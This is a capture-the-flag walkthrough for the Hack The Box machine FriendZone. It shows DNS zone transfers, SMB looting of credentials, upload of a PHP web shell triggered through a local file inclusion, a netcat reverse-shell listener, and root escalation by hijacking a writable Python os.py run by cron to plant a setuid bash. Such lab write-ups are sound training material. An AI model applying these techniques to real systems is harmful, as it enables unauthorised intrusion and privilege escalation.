# FriendZone [link](https://app.hackthebox.com/machines/FriendZone)

<!-- dns zone-transfer, pspy, smb -->


## Nmap
```
┌──(carl㉿kali)-[~]
└─$ nmap -p- 10.10.10.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 18:36 BST
Nmap scan report for 10.10.10.123
Host is up (0.017s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
```


## Anonymous FTP

```
┌──(carl㉿kali)-[~]
└─$ ftp anonymous@10.10.10.123                                                                                                           
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
```

## Friendzone.red

Connecting on port 80 shows

![website on port 80](./assets/Screenshot%202024-09-06%20at%2019.15.14.png)

Connecting on 443 the cert also shows the name friendzone.red

![website on 443](./assets/Screenshot%202024-09-06%20at%2019.07.54.png)

So add that to hosts

## DNS

Port 53 is open so check for zone transfers

```
$ host -L <domain> <dns-server>
```

```
└─$ host -l friendzone.red 10.10.10.123   
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzone.red has IPv6 address ::1
friendzone.red name server localhost.
friendzone.red has address 127.0.0.1
administrator1.friendzone.red has address 127.0.0.1
hr.friendzone.red has address 127.0.0.1
uploads.friendzone.red has address 127.0.0.1
```

```
└─$ host -l friendzoneportal.red 10.10.10.123
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzoneportal.red has IPv6 address ::1
friendzoneportal.red name server localhost.
friendzoneportal.red has address 127.0.0.1
admin.friendzoneportal.red has address 127.0.0.1
files.friendzoneportal.red has address 127.0.0.1
imports.friendzoneportal.red has address 127.0.0.1
vpn.friendzoneportal.red has address 127.0.0.1
```

add these to hosts

## SMB 
`$ smbmap -r -H 10.10.10.123`

```
└─$ smbmap -r -H 10.10.10.123

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.123:445        Name: friendzone.red            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        ./general
        dr--r--r--                0 Wed Jan 16 20:10:51 2019    .
        dr--r--r--                0 Tue Sep 13 15:56:24 2022    ..
        fr--r--r--               57 Wed Oct 10 00:52:42 2018    creds.txt
        Development                                             READ, WRITE     FriendZone Samba Server Files
        ./Development
        dr--r--r--                0 Fri Sep  6 20:04:46 2024    .
        dr--r--r--                0 Tue Sep 13 15:56:24 2022    ..
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))

```

`$ smbclient //10.10.10.123/general -N`

```
└─$ smbclient //10.10.10.123/general -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 20:10:51 2019
  ..                                  D        0  Tue Sep 13 15:56:24 2022
  creds.txt                           N       57  Wed Oct 10 00:52:42 2018

                3545824 blocks of size 1024. 1636116 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> exit
```

```
$ cat creds.txt

creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

## Admin portals

Trying the creds on both FTP and SSH doesn't work.

The dns zone transfers show `admin.friendzoneportal.red` and `administrator1.friendzone.red` so lets try these with the creds.

![website on 443](./assets/Screenshot%202024-09-06%20at%2020.18.53.png)
![website on 443](./assets/Screenshot%202024-09-06%20at%2020.16.51.png)

Not this one, try next.

![website on 443](./assets/Screenshot%202024-09-06%20at%2020.17.38.png)
![website on 443](./assets/Screenshot%202024-09-06%20at%2020.17.52.png)

Bingo

## Dashboard

![website on 443](./assets/Screenshot%202024-09-06%20at%2020.33.41.png)


```
└─$ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep  6 20:04:46 2024
  ..                                  D        0  Tue Sep 13 15:56:24 2022

                3545824 blocks of size 1024. 1622648 blocks available
smb: \> put shell.php
putting file shell.php as \shell.php (1.3 kb/s) (average 1.3 kb/s)
smb: \> ls
  .                                   D        0  Sat Sep  7 09:20:13 2024
  ..                                  D        0  Tue Sep 13 15:56:24 2022
  shell.php                           A       71  Sat Sep  7 09:20:13 2024

                3545824 blocks of size 1024. 1622644 blocks available
smb: \> exit

```

and visit 

```
https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell
```




## Shell as www-data

```
└─$ nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.28] from friendzone.red [10.10.10.123] 51634
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/var/www/admin$ 
```

```
www-data@FriendZone:/var/www/admin$ ls /home
friend
```

```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

```
www-data@FriendZone:/var/www$ su friend
Password: 
friend@FriendZone:/var/www$
```


## Shell as root

### Linpeas

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                
/dev/mqueue                                                                                                      
/dev/shm
/etc/Development
/etc/Development/shell.php
/etc/Development/test.php
/etc/sambafiles
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
```

`/usr/lib/python2.7/os.py` is writable

## Pspy

```
2024/09/07 11:40:01 CMD: UID=0     PID=30510  | /usr/bin/python /opt/server_admin/reporter.py
```

```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Write into `/usr/lib/python2.7/os.py` and wait for cron to run


```
os.system('touch /tmp/test')
```

```
0 -rw-r--r-- 1 root root    0 Sep  7 11:48 test
```

It worked. Now copy bash and set setuid bit to run as root


```
os.system('cp /bin/bash /bin/0xbeef')
os.system('chmod 4777 /bin/0xbeef')
```

```
friend@FriendZone:~$ ls -la /tmp
total 1132
drwxrwxrwt 11 root root    4096 Sep  7 11:52 .
drwxr-xr-x 22 root root    4096 Sep 13  2022 ..
-rwsrwxrwx  1 root root 1113504 Sep  7 11:52 0xbeef
```


```
/tmp/0xbeef -p
```

```
friend@FriendZone:~$ /tmp/0xbeef -p
0xbeef-4.4# whoami
root
```